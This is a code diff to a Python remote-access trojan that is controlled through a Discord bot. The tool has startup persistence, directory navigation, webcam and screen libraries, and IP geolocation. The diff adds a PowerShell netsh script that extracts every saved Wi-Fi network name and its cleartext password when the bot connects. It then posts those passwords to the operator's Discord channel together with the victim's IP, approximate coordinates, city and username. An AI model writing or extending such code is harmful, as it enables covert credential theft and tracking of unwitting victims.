@@ -5,18 +5,17 @@ import requests
 import pyautogui
 import ctypes
 import asyncio
+import sys
 from datetime import datetime
 from uuid import getnode as get_mac
 from settings import *
 from cv2 import VideoCapture, imwrite, CAP_DSHOW
 
 
-
-
-
-
+wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
 
 new_ascii = """ 
+
  .d8888b.  888          888    888                        .d8888b.                       888 
 d88P  Y88b 888          888    888                       d88P  Y88b                      888 
 Y88b.      888          888    888                       888    888                      888 
@@ -43,10 +42,6 @@ Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888
     .start              - Adds the bot to the startup directory
     .exit               - closes the connection to the bot                                             
 """
-
-
-
-
 commands = "\n".join([
     "help - Help Command",
     "ping - Ping Command",
@@ -61,17 +56,9 @@ commands = "\n".join([
     "start - Add To start",
     "exit - Exit The Session",
 ])
-
-
-
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
-
-
-
-
-
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
         if channel.name == channel_name:
@@ -80,6 +67,8 @@ async def find_channel_by_name(guild, channel_name):
 
 @client.event
 async def on_ready():
+    output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
+    decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
     response = requests.get('https://ipapi.co/json/')
     data = response.json()
     ip_address = data.get('ip')
@@ -97,11 +86,13 @@ async def on_ready():
         embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
         embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
-        embed.add_field(name="**Latitude:**", value=f"```{latitude}```",inline=True)
-        embed.add_field(name="**Longitude**",value=f"```{longitude}```",inline=True)
+        embed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
+        embed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
         embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
         embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
+        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
+        embed.add_field(name="**SSID & Passwords:**",value=f"```{decoded_wifi_pwd}```",inline=True)
         embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
         embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
         embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
@@ -115,21 +106,20 @@ async def on_ready():
         embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
         embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
-        embed.add_field(name="**Latitude:**", value=f"```{latitude}```",inline=True)
-        embed.add_field(name="**Longitude**",value=f"```{longitude}```",inline=True)
+        embed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
+        embed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
         embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
         embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
+        embed.add_field(name="**Wifi:**",value=f"```{decoded_wifi_pwd}```",inline=True)
+
         embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
         embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
         embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
         message = await channel.send(embed=embed)
         await message.pin()
-        
-    
 
-        
 @client.event
 async def on_message(message):
     guild = client.get_guild(int(guild_id))
@@ -143,8 +133,7 @@ async def on_message(message):
                 await message.reply(embed=embed)
 
             if message.content.lower() == ".ping":
-                embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
-                await message.reply(embed=embed)
+                await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
 
             if message.content.lower().startswith(".cd"):
                 directory = message.content[3:]
